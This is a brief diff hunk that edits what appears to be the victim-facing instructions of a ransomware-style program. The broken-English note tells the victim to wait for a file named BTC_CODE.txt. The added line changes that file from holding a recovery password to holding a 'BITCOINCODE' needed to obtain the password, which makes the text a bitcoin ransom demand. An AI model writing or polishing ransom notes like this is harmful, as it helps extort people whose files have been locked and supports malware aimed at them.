@@ -5,6 +5,6 @@ How to got file back?
 
 just wait 10 sec. it gonna show file name BTC_CODE.txt
 
-in BTC_CODE.txt have password for reaname back
+in BTC_CODE.txt have BITCOINCODE for get password
 and put your password and all file is normal
 biw you can change name file yourself
